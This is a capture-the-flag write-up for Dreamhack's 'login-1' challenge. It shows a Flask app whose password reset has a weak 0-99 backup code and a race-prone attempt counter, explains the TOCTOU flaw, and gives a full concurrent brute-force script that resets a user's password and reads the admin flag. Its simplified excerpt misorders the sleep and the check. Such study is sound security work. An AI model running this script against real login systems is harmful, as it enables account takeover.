---
title: login-1 @ Dreamhack
date: 2025-01-08 14:00:36 +0100
categories: [dreamhack, wargames]
tags: [python, web, race condition, TOCTOU]
math: true
mermaid: true
media_subpath: /assets/posts/dreamhack
image:
  path: preview.png
---


#### app.py
```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for, session, g
import sqlite3
import hashlib
import os
import time, random

app = Flask(__name__)
app.secret_key = os.urandom(32)

DATABASE = "database.db"

userLevel = {
    0 : 'guest',
    1 : 'admin'
}
MAXRESETCOUNT = 5

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

def makeBackupcode():
    return random.randrange(100)

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userid = request.form.get("userid")
        password = request.form.get("password")

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ? and pw = ?', (userid, hashlib.sha256(password.encode()).hexdigest() )).fetchone()
        
        if user:
            session['idx'] = user['idx']
            session['userid'] = user['id']
            session['name'] = user['name']
            session['level'] = userLevel[user['level']]
            return redirect(url_for('index'))

        return "<script>alert('Wrong id/pw');history.back(-1);</script>";

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'GET':
        return render_template('register.html')
    else:
        userid = request.form.get("userid")
        password = request.form.get("password")
        name = request.form.get("name")

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ?', (userid,)).fetchone()
        if user:
            return "<script>alert('Already Exists userid.');history.back(-1);</script>";

        backupCode = makeBackupcode()
        sql = "INSERT INTO user(id, pw, name, level, backupCode) VALUES (?, ?, ?, ?, ?)"
        cur.execute(sql, (userid, hashlib.sha256(password.encode()).hexdigest(), name, 0, backupCode))
        conn.commit()
        return render_template("index.html", msg=f"<b>Register Success.</b><br/>Your BackupCode : {backupCode}")

@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'GET':
        return render_template('forgot.html')
    else:
        userid = request.form.get("userid")
        newpassword = request.form.get("newpassword")
        backupCode = request.form.get("backupCode", type=int)

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ?', (userid,)).fetchone()
        if user:
            # security for brute force Attack.
            time.sleep(1)

            if user['resetCount'] == MAXRESETCOUNT:
                return "<script>alert('reset Count Exceed.');history.back(-1);</script>"
            
            if user['backupCode'] == backupCode:
                newbackupCode = makeBackupcode()
                updateSQL = "UPDATE user set pw = ?, backupCode = ?, resetCount = 0 where idx = ?"
                cur.execute(updateSQL, (hashlib.sha256(newpassword.encode()).hexdigest(), newbackupCode, str(user['idx'])))
                msg = f"<b>Password Change Success.</b><br/>New BackupCode : {newbackupCode}"

            else:
                updateSQL = "UPDATE user set resetCount = resetCount+1 where idx = ?"
                cur.execute(updateSQL, (str(user['idx'])))
                msg = f"Wrong BackupCode !<br/><b>Left Count : </b> {(MAXRESETCOUNT-1)-user['resetCount']}"
            
            conn.commit()
            return render_template("index.html", msg=msg)

        return "<script>alert('User Not Found.');history.back(-1);</script>";


@app.route('/user/<int:useridx>')
def users(useridx):
    conn = get_db()
    cur = conn.cursor()
    user = cur.execute('SELECT * FROM user WHERE idx = ?;', [str(useridx)]).fetchone()
    
    if user:
        return render_template('user.html', user=user)

    return "<script>alert('User Not Found.');history.back(-1);</script>";

@app.route('/admin')
def admin():
    if session and (session['level'] == userLevel[1]):
        return FLAG

    return "Only Admin !"

app.run(host='0.0.0.0', port=8000)
```

### Initial Analysis
When we first look at this challenge, we're given a Flask web application with several endpoints:

    / - Home page
    /login - User login
    /register - New user registration
    /forgot_password - Password reset functionality
    /admin - Admin-only page (contains the flag!)
    /user/<id> - User profile page

The goal is clear: we need to become an admin and access the **/admin** endpoint to get the flag.

### Understanding the Application
Let's break down how the application works:
1. **User Registration**

When you register, the system:

    Creates an account with your username, password, and name
    Assigns you a "backup code" (a random number used for password recovery)
    Sets your level to 0 (guest user)

```python
backupCode = makeBackupcode()  # Generates random number
sql = "INSERT INTO user(id, pw, name, level, backupCode) VALUES (?, ?, ?, ?, ?)"
```
2. **Password Reset Mechanism**

The password reset feature allows users to reset their password if they provide:

    Their username
    A new password
    Their backup code

There's also a brute-force protection: you only get 5 attempts before your account is locked.

```python
if user['resetCount'] == MAXRESETCOUNT:
    return "reset Count Exceed"
```

### Identifying the Vulnerability

**The Weak Backup Code**

Looking at how backup codes are generate
```python
def makeBackupcode():
    return random.randrange(100)
```
This is incredibly weak! The backup code is just a random number between 0 and 99. That means there are only 100 possible values.

Normally, with only 5 attempts allowed, we couldn't brute force this. But there's a critical flaw...

#### The Race Condition
Let's examine the password reset logic carefully:
```python
@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    # ... get user from database ...
    
    # Step 1: Check if reset count is maxed out
    if user['resetCount'] == MAXRESETCOUNT:
        return "reset Count Exceed"
    
    # Step 2: Sleep for 1 second (anti-brute-force delay)
    time.sleep(1)
    
    # Step 3: Check if backup code is correct
    if user['backupCode'] == backupCode:
        # Success - reset the counter to 0
        updateSQL = "UPDATE user set pw = ?, backupCode = ?, resetCount = 0 where idx = ?"
    else:
        # Failure - increment the counter
        updateSQL = "UPDATE user set resetCount = resetCount+1 where idx = ?"
    
    # Step 4: Commit the changes
    conn.commit()
```
**The Problem:** There's a gap between checking resetCount and updating it!

Here's what happens with a race condition:

    Request 1 arrives → reads resetCount = 0 → passes check → sleeps for 1 second
    Request 2 arrives → reads resetCount = 0 → passes check → sleeps for 1 second
    Request 3 arrives → reads resetCount = 0 → passes check → sleeps for 1 second
    ...and so on...

All these requests pass the check before any of them update the database!

This is called a **Time-of-Check to Time-of-Use (TOCTOU)** vulnerability.

### The Exploit Strategy

Since we can bypass the 5-attempt limit using the race condition, we can:

    Send 100 concurrent requests (one for each possible backup code 0-99)
    All requests will pass the ```resetCount``` check simultaneously
    One of them will have the correct backup code and successfully reset the password
    Login with the new password
    Access ```/admin``` to get the flag

#### Solve Script

```python
#!/usr/bin/env python3
import requests
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# Configuration
TARGET_URL = "http://host8.dreamhack.games:22036"  # Change to target URL
TARGET_USER = "Dog"  # The user we want to compromise
NEW_PASSWORD = "hacked123"
MAX_WORKERS = 50  # Number of concurrent threads

def attempt_reset(backup_code, session_id):
    """Attempt password reset with a specific backup code"""
    try:
        response = requests.post(
            f"{TARGET_URL}/forgot_password",
            data={
                "userid": TARGET_USER,
                "newpassword": NEW_PASSWORD,
                "backupCode": backup_code
            },
            timeout=5
        )
        
        # Check if password change was successful
        if "Password Change Success" in response.text:
            return (True, backup_code, response.text)
        elif "reset Count Exceed" in response.text:
            return (False, backup_code, "Count exceeded")
        else:
            return (False, backup_code, "Wrong code")
            
    except Exception as e:
        return (False, backup_code, f"Error: {str(e)}")

def exploit():
    """Main exploitation function"""
    print(f"[*] Starting race condition exploit against {TARGET_URL}")
    print(f"[*] Target user: {TARGET_USER}")
    print(f"[*] New password: {NEW_PASSWORD}")
    print(f"[*] Using {MAX_WORKERS} concurrent workers")
    print()
    
    # Generate all possible backup codes (0-99)
    backup_codes = list(range(100))
    
    print("[*] Sending concurrent requests to exploit race condition...")
    start_time = time.time()
    
    success = False
    correct_code = None
    
    # Use ThreadPoolExecutor for concurrent requests
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        # Submit all tasks
        future_to_code = {
            executor.submit(attempt_reset, code, i): code 
            for i, code in enumerate(backup_codes)
        }
        
        # Process results as they complete
        for future in as_completed(future_to_code):
            code = future_to_code[future]
            try:
                is_success, backup_code, message = future.result()
                
                if is_success:
                    success = True
                    correct_code = backup_code
                    print(f"\n[+] SUCCESS! Found correct backup code: {backup_code}")
                    print(f"[+] Password changed to: {NEW_PASSWORD}")
                    # Don't break - let other threads complete
                else:
                    print(f"[-] Code {backup_code}: {message}")
                    
            except Exception as e:
                print(f"[!] Exception for code {code}: {str(e)}")
    
    elapsed_time = time.time() - start_time
    print(f"\n[*] Completed in {elapsed_time:.2f} seconds")
    
    if success:
        print(f"\n[*] Attempting to login as {TARGET_USER}...")
        try:
            # Login with new password
            login_response = requests.post(
                f"{TARGET_URL}/login",
                data={
                    "userid": TARGET_USER,
                    "password": NEW_PASSWORD
                },
                allow_redirects=False
            )
            
            if login_response.status_code == 302 or "alert" not in login_response.text:
                # Get session cookie
                session = requests.Session()
                session.post(
                    f"{TARGET_URL}/login",
                    data={
                        "userid": TARGET_USER,
                        "password": NEW_PASSWORD
                    }
                )
                
                # Access admin endpoint
                print("[*] Accessing /admin endpoint...")
                admin_response = session.get(f"{TARGET_URL}/admin")
                
                if admin_response.status_code == 200 and "Only Admin" not in admin_response.text:
                    print("\n" + "="*60)
                    print("[+] FLAG CAPTURED!")
                    print("="*60)
                    print(admin_response.text)
                    print("="*60)
                else:
                    print(f"[-] Could not access admin page: {admin_response.text}")
            else:
                print("[-] Login failed after password reset")
                
        except Exception as e:
            print(f"[!] Error during login/flag retrieval: {str(e)}")
    else:
        print("\n[-] Exploit failed - could not find correct backup code")
        print("[*] The race condition might not have worked, or resetCount limit was hit")

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════╗
    ║   Race Condition Password Reset Exploit          ║
    ║   Target: Flask Password Reset Vulnerability     ║
    ╚═══════════════════════════════════════════════════╝
    """)
    
    try:
        exploit()
    except KeyboardInterrupt:
        print("\n[!] Exploit interrupted by user")
    except Exception as e:
        print(f"\n[!] Fatal error: {str(e)}")
```
